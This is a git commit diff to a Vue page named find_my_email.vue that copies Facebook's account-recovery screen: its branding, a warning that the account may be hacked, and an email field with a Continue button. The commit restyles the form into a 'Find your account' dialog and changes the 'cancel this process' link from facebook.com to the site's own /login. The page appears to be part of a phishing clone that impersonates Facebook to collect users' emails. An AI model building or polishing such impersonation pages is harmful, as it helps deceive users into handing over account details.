19a3b4ffeeadeb5ceb15494199b6c6a6e0c4da30
huynamboz <teahuynam2003@gmail.com>
2025-03-10 02:05:37 +0700

    update

--- pages/find_my_email.vue
+++ pages/find_my_email.vue
@@ -23,58 +23,49 @@ async function submitForm() {
 <template>
   <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-lvh">
     <p class="max-md:hidden text-[28px] text-[#0064E0] cursor-pointer font-bold">facebook</p>
-    <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md p-5">
+    <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md">
       <p
         class="hidden max-md:block text-center mb-3 text-[28px] text-[#0064E0] cursor-pointer font-bold"
       >
         facebook
       </p>
-      <p class="text-center">{{ $t('Enter email linked to facebook') }}</p>
-      <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
-        {{
-          $t(
-            "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
-          )
-        }}
-        <a class="text-[#0064E0]" href="http://facebook.com/profile.php">
-          {{ $t('cancel this process') }}
-        </a>
+      <div class="text-lg text-[#182440] py-5 font-semibold border-b px-5">
+        {{ $t('Find your account') }}
       </div>
-      <input
-        v-model="email"
-        type="email"
-        class="border my-4 p-2 w-full border-gray-300 rounded-md"
-        placeholder="Email"
-      />
-      <button
-        class="w-full rounded border-0 bg-blue-500 p-2 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
-        @click="submitForm"
-      >
-        {{ $t('Continue') }}
-      </button>
-      <div class="mt-5 flex flex-col items-center lg:hidden">
-        <a href="#" class="text-blue-600">{{ $t('Forgotten password?') }}</a>
-        <div class="flex w-full items-center my-4">
-          <hr class="flex-grow border-black" />
-          <span class="mx-4">or</span>
-          <hr class="flex-grow border-black" />
+      <div class="p-5 pb-1">
+        <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
+          {{
+            $t(
+              "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
+            )
+          }}
+          <a class="text-[#0064E0]" href="/login">
+            {{ $t('cancel this process') }}
+          </a>
         </div>
-        <div class="grid grid-cols-2">
-          <div class="m-5 mt-10 flex flex-col">
-            <a href="#" class="self-center whitespace-nowrap text-blue-600">English (UK)</a>
-            <a href="#" class="self-center whitespace-nowrap text-blue-600">Français (France)</a>
-            <a href="#" class="self-center whitespace-nowrap text-blue-600">Español</a>
-          </div>
-          <div class="m-5 mt-10 flex flex-col">
-            <a href="#" class="self-center whitespace-nowrap text-blue-600">Português (Brasil)</a>
-            <a href="#" class="self-center whitespace-nowrap text-blue-600">Deutsch</a>
-            <a href="#" class="self-center">+</a>
-          </div>
-        </div>
-        <span class="mt-4"
-          >Meta ©
-          {{ new Date().getFullYear() }}
-        </span>
+        <p>
+          {{ $t('Please enter your email or phone number to search your account.') }}
+        </p>
+        <input
+          v-model="email"
+          type="email"
+          class="border my-4 p-2 w-full border-gray-300 rounded-md"
+          placeholder="Email"
+        />
+      </div>
+
+      <div class="p-5 border-t flex justify-end gap-2">
+        <button
+          class="w-fit px-5 py-2 rounded border-0 bg-[#e5e7eb] font-bold text-[#55575b] hover:bg-[#d4d7de] cursor-pointer"
+        >
+          {{ $t('Cancel') }}
+        </button>
+        <button
+          class="w-fit px-5 py-2 rounded border-0 bg-blue-500 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
+          @click="submitForm"
+        >
+          {{ $t('Continue') }}
+        </button>
       </div>
     </div>
   </div>
